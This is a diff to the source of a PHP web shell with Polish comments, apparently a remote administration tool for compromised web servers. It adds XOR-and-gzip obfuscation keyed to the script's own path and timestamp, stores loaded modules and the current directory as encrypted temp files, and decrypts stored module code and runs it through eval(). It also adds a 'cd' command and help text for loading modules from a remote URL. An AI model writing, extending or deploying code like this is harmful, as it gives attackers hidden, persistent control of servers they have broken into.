@@ -206,6 +206,24 @@ info - Wyświetla informacje o systemie';
 	private $bHelp = FALSE;
 
 	/**
+	 * Unikalny klucz dla shella, za pomoca ktorego szyfrowane sa niektore dane
+	 *
+	 * @ignore
+	 * @access public
+	 * @var    string
+	 */
+	public $sKey;
+
+	/**
+	 * Specjalny prefix dla shella
+	 *
+	 * @ignore
+	 * @access public
+	 * @var    string
+	 */
+	public $sPrefix;
+
+	/**
 	 * Konstruktor
 	 *
 	 * @uses   Request
@@ -288,6 +306,16 @@ info - Wyświetla informacje o systemie';
 		$this -> bSafeMode = (boolean) ini_get( 'safe_mode' );
 
 		/**
+		 * Unikalny klucz
+		 */
+		$this -> sKey = sha1( $sScriptFilename = Request::getServer( 'SCRIPT_FILENAME' ), TRUE ) . md5( filectime( $sScriptFilename ), TRUE ) . md5( $sScriptFilename, TRUE );
+
+		/**
+		 * Prefix
+		 */
+		$this -> sPrefix = substr( base64_encode( md5( $sScriptFilename + md5( filectime( $sScriptFilename ) ), TRUE ) ), 0, 8 ) . '_';
+
+		/**
 		 * Mozliwosc wywolania polecenia systemowego
 		 */
 		if( function_exists( 'pcntl_exec' ) )
@@ -323,15 +351,10 @@ info - Wyświetla informacje o systemie';
 		}
 
 		/**
-		 * Wczytywanie modulow
-		 */
-		$sKey = sha1( Request::getServer( 'SCRIPT_FILENAME' ) ) . md5( filectime( Request::getServer( 'SCRIPT_FILENAME' ) ) );
-
-		/**
 		 * p jak PURE
 		 */
 		if(    ! isset( $_GET['p'] )
-		    && is_file( $sFilePath = $this -> sTmp . '/' . $sKey )
+		    && is_file( $sFilePath = $this -> sTmp . '/' . $this -> sPrefix . '_modules' )
 		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
 		)
 		{
@@ -344,19 +367,7 @@ info - Wyświetla informacje o systemie';
 			}
 			else
 			{
-				$iDataLen = strlen( $sData );
-
-				$sNewData = NULL;
-
-				/**
-				 * Deszyfrowanie zawartosci pliku
-				 */
-				for( $i = 0; $i < $iDataLen; ++$i )
-				{
-					$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
-				}
-
-				eval( '?>' . $sNewData . '<?' );
+				eval( '?>' . $this -> decode( $sData ) . '<?' );
 			}
 		}
 
@@ -407,6 +418,88 @@ info - Wyświetla informacje o systemie';
 				}
 			}
 		}
+
+		/**
+		 * Chdir
+		 */
+		if(     is_file( $sFile = $this -> sTmp . '/' . $this -> sPrefix . 'chdir' )
+		   && ( ( $sData = file_get_contents( $sFile ) ) !== FALSE )
+		)
+		{
+			chdir( $this -> decode( $sData ) );
+		}
+	}
+
+	/**
+	 * Proste szyfrowanie ciągu z uzyiem XOR
+	 *
+	 * @param  string $sData Tekst do zaszyfrowania
+	 * @param  string $sKey  [Optional]Klucz
+	 * @return string        Zaszyfrowany ciag
+	 */
+	public function encode( $sData, $sKey = NULL )
+	{
+		/**
+		 * Domyslny klucz
+		 */
+		if( $sKey === NULL )
+		{
+			$sKey = $this -> sKey;
+		}
+
+		if( ( $iDataLen = strlen( $sData ) ) === 0 )
+		{
+			return NULL;
+		}
+
+		$iKeyLen = strlen( $sKey );
+
+		$sNewData = NULL;
+
+		/**
+		 * Szyfrowanie
+		 */
+		for( $i = 0; $i < $iDataLen; ++$i )
+		{
+			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, $i % $iKeyLen, 2 ) ) );
+		}
+
+		return gzcompress( $sNewData, 9 );
+	}
+
+	/**
+	 * Proste deszyfrowanie ciągu z uzyiem XOR
+	 *
+	 * @param  string $sData Tekst do deszyfracji
+	 * @param  string $sKey  [Optional]Klucz
+	 * @return string        Zdeszyfrowany ciag
+	 */
+	public function decode( $sData, $sKey = NULL )
+	{
+		/**
+		 * Domyslny klucz
+		 */
+		if( $sKey === NULL )
+		{
+			$sKey = $this -> sKey;
+		}
+
+		$sData = gzuncompress( $sData );
+		$iDataLen = strlen( $sData );
+
+		$iKeyLen = strlen( $sKey );
+
+		$sNewData = NULL;
+
+		/**
+		 * Deszyfrowanie
+		 */
+		for( $i = 0; $i < $iDataLen; ++$i )
+		{
+			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, $i % $iKeyLen, 2 ) ) );
+		}
+
+		return $sNewData;
 	}
 
 	/**
@@ -483,11 +576,13 @@ info - Wyświetla informacje o systemie';
 modules - Informacje o modułach
 
 	Użycie:
+		modules loaded - lista załadowanych modułów - polecenia
 		modules version - wyświetlanie wersji modułów
 
 		modules ścieżka_do_pliku_z_modułami
 
 	Przykład:
+		modules version
 		modules version
 		modules /tmp/modules
 		modules http://example.com/modules.txt
@@ -570,18 +665,7 @@ DATA;
 		/**
 		 * Szyfrowanie zawartosci pliku
 		 */
-		$sKey = sha1( Request::getServer( 'SCRIPT_FILENAME' ) ) . md5( filectime( Request::getServer( 'SCRIPT_FILENAME' ) ) );
-
-		$iDataLen = strlen( $sData );
-
-		$sNewData = NULL;
-
-		for( $i = 0; $i < $iDataLen; ++$i )
-		{
-			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
-		}
-
-		file_put_contents( $this -> sTmp . '/' . $sKey, $sNewData );
+		file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . '_modules', $this -> encode( $sData ) );
 
 		/**
 		 * Usuwanie tymczasowego pliku
@@ -599,7 +683,8 @@ DATA;
 	private function getCommandCr3d1ts()
 	{
 		return <<<DATA
-Jakieś sugestie, pytania?\r\n\tPisz śmiało: Krzychu - <a href="mailto:krzotr@gmail.com">krzotr@gmail.com</a>
+Jakieś sugestie, pytania?
+	Pisz śmiało: Krzychu - <a href="mailto:krzotr@gmail.com">krzotr@gmail.com</a>
 DATA;
 	}
 
@@ -704,6 +789,37 @@ DATA;
 		}
 
 		return htmlspecialchars( substr( $sOutput, 0, -6 ) );
+	}
+
+	/**
+	 * Komenda - cd
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandCd()
+	{
+		if( $this -> bHelp  || ( $this -> iArgc !== 1 ) )
+		{
+			return <<<DATA
+Zmiana aktualnego katalogu
+
+	Użycie:
+		cd sciezka
+
+	Przykład:
+		cd /tmp
+DATA;
+		}
+
+		if( chdir( $this -> sArgv ) )
+		{
+			file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . 'chdir', $this -> encode( $this -> sArgv ) );
+
+			return sprintf( "Katalog zmieniono na:\r\n\t%s", $this -> sArgv );
+		}
+
+		return 'Nie udało się zmienić katalogu!!!';
 	}
 
 	/**
@@ -845,11 +961,11 @@ DATA;
 	/**
 	 * Edycja pliku
 	 *
-	 * @access public
+	 * @access private
 	 * @param  string         $sCmd Sciezka do pliku
 	 * @return string|boolean
 	 */
-	public function getCommandEdit( $sFile )
+	private function getCommandEdit( $sFile )
 	{
 		/**
 		 * Help
@@ -889,11 +1005,11 @@ DATA;
 	/**
 	 * Wrzucanie pliku
 	 *
-	 * @access public
+	 * @access private
 	 * @param  string         $sCmd Sciezka do pliku
 	 * @return string|boolean
 	 */
-	public function getCommandUpload( $sFile )
+	private function getCommandUpload( $sFile )
 	{
 		/**
 		 * Help
@@ -974,7 +1090,7 @@ DATA;
 	 * @access public
 	 * @return string
 	 */
-	public function getActionBrowser( $sCmd = NULL )
+	private function getActionBrowser( $sCmd = NULL )
 	{
 		$bRaw = ( $sCmd !== NULL );
 
@@ -1069,6 +1185,9 @@ DATA;
 			{
 				case 'help':
 					$sConsole = $this -> getCommandHelp();
+					break ;
+				case 'cd':
+					$sConsole = $this -> getCommandCd();
 					break ;
 				case 'modules':
 					$sConsole = $this -> getCommandModules();
